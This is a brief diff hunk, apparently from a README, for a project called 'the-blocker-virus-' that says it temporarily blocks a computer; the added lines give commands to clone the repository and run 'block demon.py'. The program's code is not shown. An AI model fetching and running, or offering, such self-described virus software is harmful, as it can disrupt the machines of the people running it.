@@ -5,6 +5,14 @@ it blocks the computer for tempory
 
   to  dowload  and run    
 
+  git clone https://github.com/triggered242/the-blocker-virus-.git
+cd the-blocker-virus-
+ls -la
+python3 'block demon.py'
+
+
+
+
 
 
 
